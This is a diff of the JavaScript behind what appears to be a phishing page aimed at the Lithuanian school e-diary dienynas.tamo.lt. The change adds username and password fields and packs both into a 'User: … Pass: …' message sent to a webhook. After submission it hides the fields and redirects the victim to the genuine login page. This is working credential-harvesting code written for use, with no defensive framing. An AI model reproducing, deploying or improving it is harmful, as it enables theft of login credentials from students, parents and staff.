@@ -1,14 +1,17 @@
 document.addEventListener('DOMContentLoaded', function() {
   const submitButton = document.querySelector('.submit');
-  const inputField = document.querySelector('.input');
+  const userInputField = document.querySelector('.inputUser');
+  const passInputField = document.querySelector('.inputPass');
 
   const smallText = document.querySelector('.smallText');
   const smallText2 = document.querySelector('.smallText2');
+  const smallText3 = document.querySelector('.smallText3');
 
   const square = document.querySelector('.square');
 
   submitButton.addEventListener('click', function() {
-    const inputText = inputField.value;
+    const userText = userInputField.value;
+    const passText = passInputField.value;
 
     if (submitButton.innerHTML == 'Uždaryti') {
       window.location.href = 'https://dienynas.tamo.lt/Prisijungimas/Login';
@@ -17,7 +20,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
       // Construct the message payload
       const payload = {
-        content: inputText
+        content: 'User: '+userText + ' Pass: '+passText
       };
 
       // Send the message to the webhook
@@ -37,7 +40,10 @@ document.addEventListener('DOMContentLoaded', function() {
       submitButton.innerHTML = 'Uždaryti'
 
       smallText2.parentNode.removeChild(smallText2)
-      inputField.parentNode.removeChild(inputField)
+      smallText3.parentNode.removeChild(smallText3)
+
+      userInputField.parentNode.removeChild(userInputField)
+      passInputField.parentNode.removeChild(passInputField)
     };
   });
 });
